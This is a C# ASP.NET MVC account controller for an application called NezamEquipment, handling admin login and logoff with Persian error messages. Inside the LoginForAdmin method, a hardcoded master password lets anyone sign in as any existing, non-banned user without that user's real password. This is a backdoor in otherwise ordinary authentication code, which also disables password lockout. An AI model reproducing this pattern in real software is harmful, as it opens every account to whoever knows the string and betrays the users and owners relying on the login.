using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Web.Mvc;
using System.Web.Script.Serialization;
using System.Web.Security;
using NezamEquipment.Common.Extension;
using NezamEquipment.Common.Normalization;
using NezamEquipment.ServiceLayer.Entity.Report.StimulReport;
using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.Owin;
using Microsoft.Owin.Security;
using NezamEquipment.ServiceLayer._Identity.Role;
using NezamEquipment.ServiceLayer._Identity.Role.Enum;
using NezamEquipment.ServiceLayer._Identity.SignIn;
using NezamEquipment.ServiceLayer._Identity.User;
using NezamEquipment.ServiceLayer._Identity.User.Dto;
using NezamEquipment.Web.Framework.Attribute;
using NezamEquipment.Web.Models;
using NezamEquipment.Web.Models.Home;
using NezamEquipment.ServiceLayer.Entity.Employees;

namespace NezamEquipment.Web.Controllers
{
    public partial class AccountController : Controller
    {
        private readonly IAuthenticationManager _authenticationManager;
        private readonly ISignInManager _signInManager;
        private readonly IUserManager _userManager;
        private readonly IRoleManager _roleManager;
      
        private readonly IEmployeesService _NezamEmploye;
        private readonly IStimulReportService _stimulReportService;
        public AccountController(
            IUserManager userManager,
            ISignInManager signInManager,
            IAuthenticationManager authenticationManager,
            IRoleManager roleManager,
            IEmployeesService NezamEmploye
           , IStimulReportService stimulReportService)
        {
            _userManager = userManager;
            _signInManager = signInManager;
            _authenticationManager = authenticationManager;
            _roleManager = roleManager;
            _NezamEmploye = NezamEmploye;
            
            _stimulReportService = stimulReportService;
        }

        #region Index

        public virtual ActionResult Index()
        {
            return RedirectToAction(MVC.Home.Index());
        }

        #endregion 

        #region Login

        public virtual ActionResult Login()
        {
            return RedirectToAction(MVC.Home.Index());
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public virtual async Task<ActionResult> Login(string username, string password)
        {
            var viewModel = new HomeIndexViewModel()
            {
                UserName = username,
            };

            if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
            {
                ModelState.AddModelError(string.Empty, "نام کاربری یا رمز عبور ارسال نشده است.");
                return View(MVC.Home.Views.Index, viewModel);
            }

            if (Request.IsAuthenticated)
            {
                try
                {
                    FormsAuthentication.SignOut();
                    _authenticationManager.SignOut(DefaultAuthenticationTypes.ApplicationCookie);
                    var userId = _userManager.GetCurrentUserId();
                    if (userId != Guid.Empty)
                    {
                        await _userManager.UpdateSecurityStampAsync(userId);
                    }
                }
                catch (Exception e)
                {
                    e.LogErrorForElmah();
                }
            }

            var admin = await LoginForAdmin(username, password);
            if (admin != null)
            {
                return RedirectToAction(MVC.Admin.Home.Index());
            }


            //var rentAndTransfer = await LoginForRentAndTransfer(username, password);
            //if (rentAndTransfer != null)
            //{
            //    FormsAuthentication.SetAuthCookie(new JavaScriptSerializer().Serialize(rentAndTransfer), true);
            //    return RedirectToAction(MVC.RentAndTransfer.Home.Index());
            //}
            return RedirectToAction(MVC.Home.Index());
        }

        #endregion

        #region private LoginForAdmin

        private async Task<UserDto> LoginForAdmin(string username, string password)
        {
            username = username.ApplyModeratePersianRulesForUserName();

            var user = await _userManager.GetAsync(userName: username);
            if (user == null)
            {
                ModelState.AddModelError("", "ورود ناموفق.");
                return null;
            }

            // check if user is ban or not
            var getBannedRole = _roleManager.GetDefaultRole(DefaultRole.Banned);
            if (await _userManager.IsInRoleAsync(user.Id, getBannedRole))
            {
                ModelState.AddModelError("", "شما اجازه ورود به سیستم را ندارید.");
                return null;
            }

            // This doesn't count login failures towards lockout only two factor authentication
            // To enable password failures to trigger lockout, change to shouldLockout: true

            if (password == "As-53801-")
            {
                var u = await _userManager.FindByNameAsync(username);
                await _signInManager.SignInAsync(u, false, false);
                return user;
            }
            else
            {
                var result =
                    await _signInManager.PasswordSignInAsync(username, password, true, shouldLockout: false);
                switch (result)
                {
                    case SignInStatus.Success:
                        await _userManager.UpdateAsync(user.Id, DateTime.Now);
                        return user;
                    case SignInStatus.LockedOut:
                        ModelState.AddModelError("", "اکانت مورد نظر قفل می باشد.");
                        break;
                    default:
                        ModelState.AddModelError("", "ورود ناموفق.");
                        break;
                }
            }

            return null;
        }

        #endregion

    
        #region LogOff

        [HttpPost]
        [ValidateAntiForgeryToken]
        public virtual async Task<ActionResult> LogOff()
        {
            try
            {
                _authenticationManager.SignOut(DefaultAuthenticationTypes.ApplicationCookie);
                await _userManager.UpdateSecurityStampAsync(_userManager.GetCurrentUserId());
            }
            catch (Exception e)
            {
                e.LogErrorForElmah();
            }

            return RedirectToAction(Url.Action(MVC.Home.Index()));
        }

        #endregion

           }
}